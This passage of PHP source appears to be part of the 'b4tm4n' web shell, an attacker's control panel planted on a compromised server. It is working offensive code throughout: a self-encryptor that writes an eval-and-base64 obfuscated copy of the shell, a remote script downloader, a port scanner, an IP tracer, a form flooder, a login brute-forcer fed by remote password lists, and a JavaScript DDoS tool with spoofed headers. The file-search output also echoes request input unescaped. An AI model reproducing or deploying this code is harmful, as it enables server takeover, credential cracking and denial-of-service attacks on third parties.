$z85=>$q86){if(basename($z85)!=".."){if(strpos(realpath($z85),$_REQUEST['find-value'])!==false){$c43.=sprintf("<tr>
								<td></td>
								<td><a href='?g=%s' title='%s' target='_blank'>%s</a></td>
								<td><a href='?g=%s' title='%s' target='_blank'>%s</a></td>
								<td><center>%s</center></td>
								</tr>",substr(realpath($z85),0,strrpos(realpath($z85),_)),substr(realpath($z85),0,strrpos(realpath($z85),_)),substr(realpath($z85),0,strrpos(realpath($z85),_)),realpath($z85),realpath($z85),basename(realpath($z85)),GetFileTime(realpath($z85),'modify'));$h224++;}}}printf("
					<form class='new' method=POST action='?x=find'>
						<input type='text' name='find-value' id='find-action' value='%s'/><input type='submit' name='find-button' value='Find'/>
						<label style='margin-left:10px'><font class='on'>Find: '%s' | Found's: %s</font></label>	
					</form>
					<div class='auto-number'>
						<table class='table sortable'>
							<thead>
								<tr>
									<th class='sorttable_nosort' width='15'>No.</th>
									<th>Directory</th>
									<th>Name</th>
									<th>Modified</th>
								</tr>
							<tbody>%s</tbody>
						</table>
					</div>",$_REQUEST['find-value'],$_REQUEST['find-value'],$h224,$c43);}else{print"<form class='new' method=POST action='?x=find'>
						<input type='text' name='find-value'/><input type='submit' name='find-button' value='Find'/>
						<label style='margin-left:10px'><font color='red'>Whoops, Nothing to Found's !</font></label>
					</form>";}}if($_REQUEST['x']=="update"){$l225='https://raw.githubusercontent.com/k4mpr3t/b4tm4n/master/bat.php';$r226=2.7;if($g1['debug']==true){$b227=$r226+0.1;}else{$p228=GetUrlContent($l225);$q229=strpos($p228,"current_version");$z230=substr($p228,$q229+16,3);$b227=is_numeric($z230)?$z230:$r226;}$g109="";if((float)$b227>(float)$r226){if($g1['debug']==true){$g109.='New Version Available '.$b227.'<br>Setting Debug to False for Activate this Feature';}else{$g109.='New Version Available '.$b227.'<br>Download -> [<font class="on"><a href="'.$l225.'" target="_blank">link</a></font>]';}}else{$g109.='Latest Version '.$r226;}Printf("<div id='update'>
					<a href='https://www.gnu.org/licenses/gpl-3.0.txt' target='_blank' title='License'>
						<img src='https://www.gnu.org/graphics/lgplv3-88x31.png'/>
					</a><br><br>%s
				</div>",$g109);}if($_REQUEST['x']=="self-encryptor"){if($i231=htmlentities(@file_get_contents(__FILE__))){$c232=strpos($i231,$_SESSION["action"]["password"]);$m233=substr($i231,$c232+48);$x234="\$".substr(str_shuffle("abcdefghijklmnopqrstuvwxyz"),0,rand(1,3));$v235="\$".substr(str_shuffle("abcdefghijklmnopqrstuvwxyz"),0,rand(2,5));$v9="b";$a10="a";$d11="s";$t12="e";$w13="6";$q14="4";$d15="_";$q16="e";$y17="n";$t18="c";$w19="o";$k20="d";$j21="e";$r236=$v9.$a10.$d11.$t12.$w13.$q14.$d15.$q16.$y17.$t18.$w19.$k20.$j21;$t237=$v9.$a10.$d11.$t12.$w13.$q14.$d15.$k20.$j21.$t18.$w19.$k20.$j21;$p22=array('"\142\141\163\x65\66\x34\137\x64\x65\x63\157\144\145"','strrev("ed"."oce"."d_4"."6es"."ab")','strrev("e"."doc"."ed_"."46e"."sab")','"b"."as"."e6"."4_"."d"."ec"."o"."de"','"ba"."se"."6"."4_d"."e"."cod"."e"');$s238=array_rand($p22);$u239=$p22[$s238];$x240=$x234.'="'.$_SESSION["action"]["username"].':'.$_SESSION["action"]["password"].'";';$c241=$v235.'='.$u239.';';$z242=array($x240.$c241,$c241.$x240);$i243=array_rand($z242);$t244=$z242[$i243];$k245=preg_replace("/\\\$x_/",$x234,$m233);$c246='';$c246.='<?php ';$c246.=$t244;$c246.='@eval('.$v235.'("';$c246.=$r236(htmlspecialchars_decode($k245));$c246.='"))';$c246.='?>';$t148=!empty($_REQUEST['name'])?$_REQUEST['name']:'bat_encrypt.php';$r29=dirname(__FILE__)._.$t148;$u31=fopen($r29,'w+');fwrite($u31,$c246);fclose($u31);printf("<center class='on'>SELF ENCRYPT CREATED !!!</center>
					<center class='on'>
						Link -> <a href='%s' target='_blank'><u>%s</u></a>
					</center>",GetUrlFromPath($r29),$t148);}else{print"<center class='off'>SELF ENCRYPT ENABLE !!!</center>";}}}if(any("z",$_REQUEST)){$l247=$_REQUEST['z'];printMenuTools(array("target-map"=>array("title"=>"Target Map","ver"=>"2.0","auth"=>"k4mpr3t"),"port-scanner"=>array("title"=>"Scan Port","ver"=>"1.0","auth"=>"k4mpr3t"),"script-loader"=>array("title"=>"Script Loader","ver"=>"1.0","auth"=>"k4mpr3t"),"encryptor"=>array("title"=>"Encryptor","ver"=>"1.1","auth"=>"k4mpr3t"),"form-bruteforces"=>array("title"=>"Form Bruteforces","ver"=>"1.0","auth"=>"k4mpr3t"),"login-bruteforces"=>array("title"=>"Login Bruteforces","ver"=>"1.0","auth"=>"k4mpr3t"),"mass-tools"=>array("title"=>"Mass Tools","ver"=>"1.0","auth"=>"k4mpr3t"),"ddos-attack"=>array("title"=>"DDOS Attack","ver"=>"2.0","auth"=>"k4mpr3t"),));print"<div id='tools'>";if(empty($l247)){printf("<div id='thanks'>
					<h2>Nothing Is Secure...</h2>
					<h3>WHY SO serious ?!</h3>
				</div>");}if($l247=="target-map"){print"<div class='tools-header'>
				  <h3>".$t90[$l247]['title']." v".$t90[$l247]['ver']."</h3>
				  <h3> by: ".$t90[$l247]['auth']."</h3>
			  </div>";printf("<div id='target-map'>
			<form onsubmit='return false;' class='new'>
				<input type='text' id='map-ip' value='%s'/>
				<input type='submit' value='Trace' onclick=\"return getAjax(true,'target-info','POST','?z=target-map&ip='+document.getElementById('map-ip').value);\"/><br>
			</form>
		</div>
		<div id='target-info' class='result'></div>",gethostbyname(http_host));if(any("ip",$_REQUEST)){ob_clean();$r248=!empty($_REQUEST['ip'])?$_REQUEST['ip']:gethostbyname(http_host);$t249=filter_var($r248,FILTER_VALIDATE_IP)or die('Invalid IP Address');if($_REQUEST['ip']==gethostbyname(http_host)){$j57=B64D("zSI9xWleO7odODUdzH4qy79ezmMeyr1=");$g250=GetUrlContent($j57);$c251=json_decode($g250,true);}else{$j57=sprintf(B64D("zSI9xWleO7odODUdzH4qy79ezmMeyr1=")."%s",$r248);$g250=GetUrlContent($j57);$c251=json_decode($g250,true);}$j57=sprintf(B64D("zSI9xSN3Ob0gBCYaOnwey7whAH4kwX0gBCYa")."?q=%s,%s&z=10&output=embed",$c251['lat'],$c251['lon']);printf("<div class='divide'>
						<div class='divide-left'>
							<table class='table'>
								<tr><td>AS</td><td>%s</td></tr>
								<tr><td>City</td><td>%s</td></tr>
								<tr><td>Country</td><td>%s</td></tr>
								<tr><td>Country Code</td><td>%s</td></tr>
								<tr><td>ISP</td><td>%s</td></tr>
								<tr><td>Latitude</td><td>%s</td></tr>
								<tr><td>Logitude</td><td>%s</td></tr>
							</table>
						</div>
						<div class='divide-left'>
							<table class='table'>
								<tr><td>Origin</td><td>%s</td></tr>
								<tr><td>IP</td><td>%s</td></tr>
								<tr><td>Region</td><td>%s</td></tr>
								<tr><td>Region Name</td><td>%s</td></tr>
								<tr><td>Timezone</td><td>%s</td></tr>
								<tr><td>Zip</td><td>%s</td></tr>
								<tr><td>Status</td><td>%s</td></tr>
							</table>
						</div>
					</div>
					<iframe src='%s' width='100%%' height='345' frameBorder='0'><iframe>",$c251['as'],$c251['city'],$c251['country'],$c251['countryCode'],$c251['isp'],$c251['lat'],$c251['lon'],$c251['org'],$c251['query'],$c251['region'],$c251['regionName'],$c251['timezone'],$c251['zip'],$c251['status'],$j57);exit;}}if($l247=="port-scanner"){print"<div class='tools-header'>
				  <h3>".$t90[$l247]['title']." v".$t90[$l247]['ver']."</h3>
				  <h3> by: ".$t90[$l247]['auth']."</h3>
			  </div>";printf("<div id='port-scan'>
					<form onsubmit='return false;' class='new'>
						<label>Host Port</label><input type='text' id='ip-port' value='%s'/><br>
						<label>Start Port</label><input type='text' id='start-port' value='1'/><br>
						<label>End Port</label><input type='text' id='end-port' value='65535'/><br>
						<label>Methode</label><select id='scan-port'><option value='1'>socket_connect</option><option value='2'>fsockopen</option></select><br>
						<input type='submit' onclick=\"return getAjax(true,'port-result','POST','?z=port-scanner&x=scan-port&ip='+document.getElementById('ip-port').value+'&sp='+document.getElementById('start-port').value+'&ep='+document.getElementById('end-port').value+'&mtd='+document.getElementById('scan-port').value);\" value=Scan />
						<input type='submit' onclick=\"return ajaxAbort(true,'port-result')\" value=Cancel />
					</form>
				</div>
				<div id='port-result' class='result'></div>",gethostbyname(http_host));if(any("x",$_REQUEST)&&$_REQUEST['x']=="scan-port"){ob_clean();$b178=$_REQUEST['ip'];$m191=$_REQUEST['sp'];$l193=$_REQUEST['ep'];$s252=$_REQUEST['mtd'];switch($s252){case '1':if(function_exists('socket_create')){$g253=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);for($v254=$m191;$v254<=$l193;$v254++){$q255=@socket_connect($g253,$b178,$v254);if($q255){print"<br>port $v254 open";socket_close($g253);$g253=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);}}}else{print"Error socket_connect<br>";}break;case '2':for($v254=$m191;$v254<=$l193;$v254++){$q255=@fsockopen($b178,$v254);if($q255){print"<br>port $v254 open";fclose($q255);}}break;}print"<br>Scan Finish.";exit;}}if($l247=="script-loader"){print"<div class='tools-header'>
				  <h3>".$t90[$l247]['title']." v".$t90[$l247]['ver']."</h3>
				  <h3> by: ".$t90[$l247]['auth']."</h3>
			  </div>";$d56=dirname(__FILE__)._.'script-loader';if(!is_dir($d56))mkdir($d56,0755);$c221=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($d56),RecursiveIteratorIterator::LEAVES_ONLY);$c43="";foreach($c221 as $z85=>$q86){if(basename($z85)!=".."&&basename($z85)!="."){$c43.=sprintf("<tr>
						<td></td>
						<td><a href='%s' target='_blank'>%s</a></td>
						<td><center>%s</center></td>
						</tr>",GetUrlFromPath(realpath($z85)),basename(realpath($z85)),GetFileTime(realpath($z85),'modify'));}}printf("<div id='script-loader'>
					<div class='divide'>
						<div class='divide-left'>
							<form onsubmit='return false;' class='new'>
								<label>Url</label><input type='text' id='url-source' value=''/><br>
								<label>Filename</label><input type='text' id='file-name' value=''/><br>
								<input type='submit' onclick=\"return getAjax(true,'download-result','POST','?z=script-loader&url='+document.getElementById('url-source').value+'&filename='+document.getElementById('file-name').value);\"/><br>
								<div id='download-result' class='result'></div>
							</form>
						</div>
						<div class='divide-right'>
							<fieldset>
								<legend>List's</legend>
								<div class='auto-number'>
									<table class='table'>
									<thead><tr><th>No.</th><th>Name</th><th>Modified</th>
									<tbody>%s</tbody>
									</table>
								</div>
							</fieldset>
						</div>
					</div>
				</div>",$c43);if(any("url",$_REQUEST)&&any("filename",$_REQUEST)){ob_clean();$j57=$_REQUEST['url'];$t205=$_REQUEST['filename'];$c124=rtrim($d56,_)._.$t205;if(GetUrlExists($j57)&&!empty($t205)){if(GetDownloadUrl($j57,$c124)){$j57=GetUrlFromPath($c124);printf("Success -> <a href='$j57' target='_blank'><u>Link</u></a>");}else{print"<br>Failed";}print"<br>Finish";}else{print"<br>Mistakes";}exit;}}if($l247=="encryptor"){print"<div class='tools-header'>
				  <h3>".$t90[$l247]['title']." v".$t90[$l247]['ver']."</h3>
				  <h3> by: ".$t90[$l247]['auth']."</h3>
			  </div>";printf("<div id='script-loader'>
			<form onsubmit='return false;' class='new'>
				<div class='hash-control'>
					<div class='hash'>
						<input type='radio' name='encr' value='basic' checked><label>Basic</label>
						<select id='basic-hash'>
							<option value='md5'>Md5</option>
							<option value='asc'>Char</option>
							<option value='chr'>Ascii</option>
							<option value='sha1'>Sha1</option>
							<option value='crc32'>Crc32</option>
							<option value='B64E'>B64E</option>
							<option value='B64D'>B64D</option>
							<option value='urlencode'>URL Encode</option>
							<option value='urldecode'>URL Decode</option>
							<option value='strlen'>String Length</option>
							<option value='strrev'>String Reverse</option>
							<option value='base64_encode'>Base64 Encode</option>
							<option value='base64_decode'>Base64 Decode</option>
							<option value='entties'>Htmlentities</option>
							<option value='spechar'>Htmlspecialchars</option>
						</select>
					</div>
					<div class='hash'>
						<input type='radio' name='encr' value='extra'><label>Extra</label>
						<select id='extra-hash'>
							<option value='asc-hex'>Ascii => Hex</option>
							<option value='asc-bin'>Ascii => Binary</option>
							<option value='hex-asc'>Hex => Ascii</option>
							<option value='hex-bin'>Hex => Binary</option>
							<option value='bin-asc'>Binary => Ascii</option>
							<option value='bin-hex'>Binary => Hex</option>
						</select>
					</div>
					<div class='hash'>
						<input type='radio' name='encr' value='crypt'><label>Crypt</label>
						<input type='text' id='crypt-salt' name='salt' placeholder='\$alt'/>
					</div>
					<div class='hash'>
						<input type='radio' name='encr' value='hash'><label>Hash</label>
						<select id='hash-hash'><option value='md2'>md2</option><option value='md4'>md4</option><option value='md5'>md5</option><option value='sha1'>sha1</option><option value='sha256'>sha256</option><option value='sha384'>sha384</option><option value='sha512'>sha512</option><option value='ripemd128'>ripemd128</option><option value='ripemd160'>ripemd160</option><option value='ripemd256'>ripemd256</option><option value='ripemd320'>ripemd320</option><option value='whirlpool'>whirlpool</option><option value='tiger128,3'>tiger128,3</option><option value='tiger160,3'>tiger160,3</option><option value='tiger192,3'>tiger192,3</option><option value='tiger128,4'>tiger128,4</option><option value='tiger160,4'>tiger160,4</option><option value='tiger192,4'>tiger192,4</option><option value='snefru'>snefru</option><option value='gost'>gost</option><option value='adler32'>adler32</option><option value='crc32'>crc32</option><option value='crc32b'>crc32b</option><option value='haval128,3'>haval128,3</option><option value='haval160,3'>haval160,3</option><option value='haval192,3'>haval192,3</option><option value='haval224,3'>haval224,3</option><option value='haval256,3'>haval256,3</option><option value='haval128,4'>haval128,4</option><option value='haval160,4'>haval160,4</option><option value='haval192,4'>haval192,4</option><option value='haval224,4'>haval224,4</option><option value='haval256,4'>haval256,4</option><option value='haval128,5'>haval128,5</option><option value='haval160,5'>haval160,5</option><option value='haval192,5'>haval192,5</option><option value='haval224,5'>haval224,5</option><option value='haval256,5'>haval256,5</option></select>
						<input type='checkbox' id='hash-raw'/> Raw
					</div>
					<div class='hash'>
						<input type='submit' onclick=\"
						url='';
						textencode=window.btoa(document.getElementById('hashtext').value);
						radios=document.getElementsByName('encr');
						for(var i=0,length=radios.length;i<length;i++){
							if (radios[i].checked){
								switch(radios[i].value){
									case 'basic':
										url='?z=encryptor&opt=basic&hash='+document.getElementById('basic-hash').value+'&text-encode='+textencode;
									break;
									case 'extra':
										url='?z=encryptor&opt=extra&hash='+document.getElementById('extra-hash').value+'&text-encode='+textencode;
									break;
									case 'crypt':
										url='?z=encryptor&opt=crypt&salt='+document.getElementById('crypt-salt').value+'&text-encode='+textencode;
									break;
									case 'hash':
										url='?z=encryptor&opt=hash&hash='+document.getElementById('hash-hash').value+'&raw='+document.getElementById('hash-raw').checked+'&text-encode='+textencode;
									break;
								}
								break;
							}
						}
						return getAjax(false,'hashresult','POST',url);
						\"/>
						<input type='submit' onclick=\"
							tempi=document.getElementById('hashresult').value;
							tempi1=document.getElementById('hashtext').value;
							document.getElementById('hashtext').value=tempi.trim();
							document.getElementById('hashresult').value=tempi1.trim();
						\" value='Swap'/>
					</div>
				</div>
				<div class='hash-capture'>
					<div class='hash-capture-left'>
						<label>String</label><textarea id='hashtext'></textarea>
						<input type='submit' onclick=\"
							document.getElementById('hashtext').value='';
						\" value='Clear'/>
					</div>
					<div class='hash-capture-right'>
						<label>Result</label><textarea id='hashresult'></textarea>
						<input type='submit' onclick=\"
							document.getElementById('hashresult').value='';
						\" value='Clear'/>
					</div>
				</div>
			</form>
		</div>");function chr_asc($o256){$x257='';for($m75=0;$m75<strlen($o256);$m75++)$x257.=ord($o256{$m75}).' ';return rtrim($x257);}function asc_chr($x257){$o256='';if(strpos($x257,' ')){$a258=explode(' ',$x257);foreach($a258 as $t67)$o256.=chr($t67);}else{$o256=chr($x257);}return $o256;}function asc_hex($x257){$p259='';for($m75=0;$m75<strlen($x257);$m75++)$p259.=sprintf("%02x",ord(substr($x257,$m75,1)));return $p259;}function hex_asc($p259){$x257='';for($m75=0;$m75<strlen($p259);$m75+=2)$x257.=chr(hexdec(substr($p259,$m75,2)));return $x257;}function hex_bin($p259){$e260='';for($m75=0;$m75<strlen($p259);$m75++)$e260.=str_pad(decbin(hexdec($p259{$m75})),4,'0',STR_PAD_LEFT);return $e260;}function bin_hex($e260){$p259='';for($m75=strlen($e260)-4;$m75>=0;$m75-=4)$p259.=dechex(bindec(substr($e260,$m75,4)));return strrev($p259);}function asc_bin($x257){$p259=asc_hex($x257);return hex_bin($p259);}function bin_asc($e260){$p259=bin_hex($e260);return hex_asc($p259);}if(any("opt",$_REQUEST)){ob_clean();$t261=$_REQUEST['opt'];$v9="b";$a10="a";$d11="s";$t12="e";$w13="6";$q14="4";$d15="_";$q16="e";$y17="n";$t18="c";$w19="o";$k20="d";$j21="e";$r236=$v9.$a10.$d11.$t12.$w13.$q14.$d15.$q16.$y17.$t18.$w19.$k20.$j21;$t237=$v9.$a10.$d11.$t12.$w13.$q14.$d15.$k20.$j21.$t18.$w19.$k20.$j21;$n262=$t237($_POST['text-encode']);if($t261=='basic'){$p263=$_REQUEST['hash'];switch($p263){case "md5":printmd5($n262);break;case "sha1":printsha1($n262);break;case "chr":printasc_chr($n262);break;case "asc":printchr_asc($n262);break;case "crc32":printcrc32($n262);break;case "strlen":printstrlen($n262);break;case "strrev":printstrrev($n262);break;case "urlencode":printurlencode($n262);break;case "urldecode":printurldecode($n262);break;case "entties":printhtmlentities($n262);break;case "spechar":printhtmlspecialchars($n262);break;case "base64_encode":print$r236($n262);break;case "base64_decode":print$t237($n262);break;case "B64E":printB64E($n262);break;case "B64D":printB64D($n262);break;}}elseif($t261=='extra'){$p263=$_REQUEST['hash'];switch($p263){case "chr-asc":printstr_asc($n262);break;case "asc-chr":printasc_str($n262);break;case "asc-hex":printasc_hex($n262);break;case "hex-asc":printhex_asc($n262);break;case "hex-bin":printhex_bin($n262);break;case "bin-hex":printbin_hex($n262);break;case "asc-bin":printasc_bin($n262);break;case "bin-asc":printbin_asc($n262);break;}}elseif($t261=='crypt'){$h264=$_REQUEST['salt'];printcrypt($n262,$h264);}elseif($t261=='hash'){$p263=$_REQUEST['hash'];$r265=$_REQUEST['raw'];if($r265==true){printhash($p263,$n262,true);}else{printhash($p263,$n262);}}exit;}}if($l247=="form-bruteforces"){print"<div class='tools-header'>
			  <h3>".$t90[$l247]['title']." v".$t90[$l247]['ver']."</h3>
			  <h3> by: ".$t90[$l247]['auth']."</h3>
		  </div>";$t67=array('{','"name":"Handsome",','"email":"very@handsome.com",','"subject":"WHOOPS YOU GOT E-MAIL ?!",','"message":"HA HA HA HA HA HA HA HA",','}');printf("<div class='divide'>
				<div class='divide-left'>
					<form onsubmit='return false;' class='new'>
						<label>Url Action</label><input type='text' id='form-url' placeholder='http://'/><br>
						<label>Count's</label><input type='number' id='form-count' value='100' min='10' autocomplete='off'/><br>
						<label>Parameter (JSON)</label>
						<textarea id='form-parameter'>%s</textarea>
						<input type='submit' onclick=\"return ajaxAbort(true,'form-result')\" value=Cancel />
						<input type='submit' value='Attack' onclick=\"return getAjax(true,'form-result','POST','?z=form-bruteforces&url='+document.getElementById('form-url').value+'&parameter='+document.getElementById('form-parameter').value+'&count='+document.getElementById('form-count').value);\"/><br>
					</form>
				</div>
				<div class='divide-right'>
					<fieldset>
						<legend>Result's</legend>
						<div id='form-result' class='result'></div>
					</fieldset>
				</div>
			</div>",implode($t67,"\n"));if(any("url",$_REQUEST)&&any("parameter",$_REQUEST)){ob_clean();$y34=$t218=$m219=0;$j57=$_REQUEST['url'];$l266=$_REQUEST['count'];$c267=$_REQUEST['parameter'];$s58=json_decode($c267,true);if(!is_array($s58))$s58=array();do{$y34++;$b51=curl_init();curl_setopt($b51,CURLOPT_USERAGENT,$s32);curl_setopt($b51,CURLOPT_URL,$j57);curl_setopt($b51,CURLOPT_POST,1);curl_setopt($b51,CURLOPT_CONNECTTIMEOUT,10);curl_setopt($b51,CURLOPT_POSTFIELDS,http_build_query($s58));curl_setopt($b51,CURLOPT_RETURNTRANSFER,1);curl_setopt($b51,CURLOPT_FOLLOWLOCATION,1);$c43=curl_exec($b51);$j268=curl_getinfo($b51,CURLINFO_HTTP_CODE);if(curl_error($b51))echo curl_error($b51);curl_close($b51);if($j268==200){$t218++;}else{$m219++;}if($y34==$l266){echo"Success: $t218<br>Failed: $m219<br>Messages: ".htmlspecialchars($c43);}}while($y34<=$l266);exit;}}if($l247=="login-bruteforces"){print"<div class='tools-header'>
			  <h3>".$t90[$l247]['title']." v".$t90[$l247]['ver']."</h3>
			  <h3> by: ".$t90[$l247]['auth']."</h3>
		  </div>";printf("<div id='login-bruteforces'>
			<div class='divide-left'>
				<form onsubmit='return false;' class='new'>
					<label>Url Action</label><input type='text' id='login-url' placeholder='http://'/><br>
					<label>User List</label><input type='text' id='login-user' placeholder='admin' value='admin'/><br>
					<label>&nbsp;</label><input type='text' id='login-username' placeholder='User Fieldname'/><br>
					<label>Pass List</label><input type='text' id='login-passlist' placeholder='http://'/><br>
					<label>&nbsp;</label><input type='text' id='login-passname' placeholder='Pass Fieldname'/><br>
					<input type='submit' onclick=\"return getAjax(true,'login-result','POST',
					'?z=login-bruteforces'+
					'&url='+document.getElementById('login-url').value+
					'&user='+document.getElementById('login-user').value+
					'&userfield='+document.getElementById('login-username').value+
					'&passfield='+document.getElementById('login-passname').value+
					'&passlist='+document.getElementById('login-passlist').value);\"/><br>
				</form>
			</div>
			<div class='divide-right'>
				<fieldset>
					<legend>Result's</legend>
					<div id='login-result' class='result'></div>
				</fieldset>
			</div>
		</div>");if(any("url",$_REQUEST)&&any("user",$_REQUEST)){ob_clean();$j57=$_REQUEST['url'];$g70=$_REQUEST['user'];$r29=GetUrlExists($_REQUEST['passlist'])?GetUrlContent($_REQUEST['passlist']):$_REQUEST['passlist'];$z269=explode("\n",$r29);$f270=count($z269);foreach($z269 as $v271=>$i272){$c267=http_build_query(array($_REQUEST['userfield']=>$g70,$_REQUEST['passfield']=>$i272,'Submit'=>'Submit',));$b51=curl_init();curl_setopt($b51,CURLOPT_USERAGENT,$s32);curl_setopt($b51,CURLOPT_URL,$j57);curl_setopt($b51,CURLOPT_POST,1);curl_setopt($b51,CURLOPT_TIMEOUT,5);curl_setopt($b51,CURLOPT_CONNECTTIMEOUT,5);curl_setopt($b51,CURLOPT_POSTFIELDS,$c267);curl_setopt($b51,CURLOPT_RETURNTRANSFER,1);$j273=curl_exec($b51);$o274=curl_getinfo($b51,CURLINFO_HTTP_CODE);if(curl_error($b51))echo curl_error($b51);curl_close($b51);if($o274==200){echo"FOUND'S: $g70:$i272<br>";exit;}else{echo htmlspecialchars($j273);}}exit;}}if($l247=="mass-tools"){print"<div class='tools-header'>
			  <h3>".$t90[$l247]['title']." v".$t90[$l247]['ver']."</h3>
			  <h3> by: ".$t90[$l247]['auth']."</h3>
		  </div>";print"Coming Soon";}if($l247=="ddos-attack"){print"<div class='tools-header'>
			<h3>".$t90[$l247]['title']." v".$t90[$l247]['ver']."</h3>
			<h3> by: ".$t90[$l247]['auth']."</h3>
		  </div>";printf('<script type="text/javascript">

					window.onload=function(){

						startTime();

						var interval;
						var xhttp;

						var requestsNode=document.getElementById("requests"),
					        successNode=document.getElementById("success"),
					        proccessNode=document.getElementById("proccess"),
					        targetNode=document.getElementById("target"),
					        attack=document.getElementById("attack"),
					        method=document.getElementById("method"),
					        size=document.getElementById("size"),
					        time=document.getElementById("time"),
					        stamp=document.getElementById("stamp")
					        uagent=document.getElementById("uagent")
					        referer=document.getElementById("referer")
					        origin=document.getElementById("origin")

						var requests=0,
					        succeeded=0,
					        proccess=0;

						var makeHttpRequest=function(){
							var data=new FormData();
							var buff=new ArrayBuffer(65536);
							var xhrx=new XMLHttpRequest();
							var agent =["Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:5.0) Gecko/20110619 Firefox/5.0",
							"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:5.0) Gecko/20100101 Firefox/5.0",
							"Mozilla/5.0 (Windows NT 6.2; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0",
							"Mozilla/5.0 (Windows NT 5.2; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0",
							"Mozilla/5.0 (Windows NT 5.0; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0",
							"Mozilla/5.0 (Windows NT 5.1; U; rv:5.0) Gecko/20100101 Firefox/5.0",
							"Mozilla/5.0 (Windows NT 6.1.1; rv:5.0) Gecko/20100101 Firefox/5.0",
							"Mozilla/5.0 (Windows NT 5.1; rv:2.0.1) Gecko/20100101 Firefox/5.0",
							"Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20100101 Firefox/5.0",
							"Mozilla/5.0 (Windows NT 5.0; rv:5.0) Gecko/20100101 Firefox/5.0"];
							randomize=function(arr){
							rand=Math.floor((Math.random()*arr.length));
						    return arr[rand];}
							xhrx.open(method.value,targetNode.value,true);
							if (uagent.checked) xhrx.setRequestHeader("user-agent",randomize(agent));
							if (referer.checked) xhrx.setRequestHeader("referer",targetNode.value);
							if (origin.checked) xhrx.setRequestHeader("origin","*");
							xhrx.onreadystatechange=function(){
							    if(xhrx.readyState==XMLHttpRequest.DONE){
							    	if(xhrx.status>=500){
								    	onSuccess();
								    }
								    onProcess();
							   	}
							   	onRequest();
							}
							xhttp=xhrx;
							attack=function(){
							str="";arr=new Uint32Array(buff);
							window.crypto.getRandomValues(arr);
							for(var i=0;i<arr.length;i++){
							str+=String.fromCharCode(arr[i]);
							}return str;}
							what=attack();
							for(var j=0;j<size.value;j++){
							data.append(what, stamp.value);}
							xhrx.send(data);
					        };

						var onRequest=function(){
					            requests++;
					            requestsNode.innerHTML=requests;
						    };

						var onProcess=function(){
						    	proccess++;
					            proccessNode.innerHTML=proccess;
						    };

						var onSuccess=function(){
					            success++;
					            successNode.innerHTML=success;
					    	};

						attack.onclick=function(){
							var today=new Date();
						    var h=today.getHours();
						    var m=today.getMinutes();
						    var s=today.getSeconds();
						    m=m<10?"0"+m:m;
						    s=s<10?"0"+s:s;
							if(this.value==\'Start\'){
								this.value="Stop";
								requests=0;
						        succeeded=0;
						        proccess=0;
						        document.getElementById("start").innerHTML="00:00:00";
						        document.getElementById("finish").innerHTML="00:00:00";
								interval=setInterval(makeHttpRequest,(parseInt(time.value)));
								document.getElementById("start").innerHTML=h+":"+m+":"+s;
							}else if(this.value==\'Stop\'){
								this.value="Start";
								xhttp.abort();
								clearInterval(interval);
								document.getElementById("finish").innerHTML=h+":"+m+":"+s;
							}
						};

						function startTime(){
						    var today=new Date();
						    var h=today.getHours();
						    var m=today.getMinutes();
						    var s=today.getSeconds();
						    m=m<10?"0"+m:m;
						    s=s<10?"0"+s:s;
						    document.getElementById("times").innerHTML=h+":"+m+":"+s;
						    var t=setTimeout(startTime,500);
						}
					}
				</script>
				<form onsubmit="return false;" class="new">
					<label>Target</label><input type="text" id="target" value="http://www.target.com"><br>
					<label>Stamp</label><input type="text" id="stamp" value="DDOS ATTACK !!!"><br>
					<label>Method</label><select id="method">
					<option value="PUT">PUT</option>
					<option value="GET">GET</option>
					<option value="POST">POST</option>
					<option value="HEAD">HEAD</option>
					<option value="TRACE">TRACE</option>
					<option value="PATCH">PATCH</option>
					<option value="OPTIONS">GET</option>
					<option value="DELETE">DELETE</option>
					<option value="CONNECT">CONNECT</option>
					<option value="OPTIONS">OPTIONS</option>
					</select><br>
					<label>Size (kB)</label><input type="number" id="size" value="1024"><br>
					<label>Time (ms)</label><input type="number" id="time" value="500"><br>
					<label>Options</label>
					<input type="checkbox" id="uagent" name="uagent" style="vertical-align:middle"> User Agent
					<input type="checkbox" id="referer" name="referer" style="vertical-align:middle"> Referer  Target
					<input type="checkbox" id="origin" name="origin" style="vertical-align:middle"> Origin<br>
					<label style="margin:5px 0px 5px">
						Time <span id="times">00:00:00</span> | 
						Start <span id="start">00:00:00</span> | 
						Finish <span id="finish">00:00:00</span>
					</label><br>
					<label style="margin:0px 0px 5px">
						Requests <span id="requests">0</span> | 
						Proccess <span id="proccess">0</span> | 
						Success <span id="success">0</span>
					</label><br>
					<input type="submit" id="attack" value="Start"/>
				</form>');}print"</div>";}printf("</div><!-- content -->
		</div><!-- container -->
			<div id='footer'>
				<div id='copyrights'><a href='//github.com/k4mpr3t/b4tm4n'>k4mpr3t</a> &copy; %s</div>
				<div id='pageload'>Page Loaded in %s Seconds</div>
			</div>
		</body>
		</html>",date('Y'),round((microtime(true)-$y34),2));}?>
